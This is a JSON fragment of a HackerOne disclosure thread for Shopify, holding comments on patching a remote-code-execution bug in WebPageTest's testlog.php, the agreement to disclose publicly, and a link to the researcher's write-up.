ckerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":510333,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'll just wait for @pmeenan's input on that. I know there are a few instances of this app that might need to be patched (webpagetest.org for example).","markdown_message":"\u003cp\u003eI\u0026#39;ll just wait for \u003ca href=\"/pmeenan\"\u003e@pmeenan\u003c/a\u003e\u0026#39;s input on that. I know there are a few instances of this app that might need to be patched (webpagetest.org for example).\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-15T17:34:02.126Z","updated_at":"2015-07-15T17:34:02.126Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":510334,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Works for me, that is the final patch for the RCE.","markdown_message":"\u003cp\u003eWorks for me, that is the final patch for the RCE.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-15T17:35:02.523Z","updated_at":"2015-07-15T17:35:02.523Z","actor":{"username":"pmeenan","cleared":false,"url":"/pmeenan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":510349,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-07-15T17:40:56.055Z","updated_at":"2015-07-15T17:40:56.055Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":511897,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"https://prakharprasad.com/shopify-remote-code-execution/","markdown_message":"\u003cp\u003e\u003ca title=\"https://prakharprasad.com/shopify-remote-code-execution/\" href=\"/redirect?url=https%3A%2F%2Fprakharprasad.com%2Fshopify-remote-code-execution%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://prakharprasad.com/shopify-remote-code-execution/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-16T12:02:44.280Z","updated_at":"2015-07-16T12:02:44.280Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":511898,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-07-16T12:02:44.571Z","updated_at":"2015-07-16T12:02:44.571Z","actor":{"username":"prakharprasad","cleared":true,"url":"/prakharprasad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4Qcsaci6HdNLQCPM7oBdhJYY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":275,"category":"researcher","content":"This vulnerability was found by reviewing source code of https://github.com/WPO-Foundation/webpagetest/blob/master/www/testlog.php","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis vulnerability was found by reviewing source code of \u003ca title=\"https://github.com/WPO-Foundation/webpagetest/blob/master/www/testlog.php\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWPO-Foundation%2Fwebpagetest%2Fblob%2Fmaster%2Fwww%2Ftestlog.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/WPO-Foundation/webpagetest/blob/master/www/testlog.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"}]}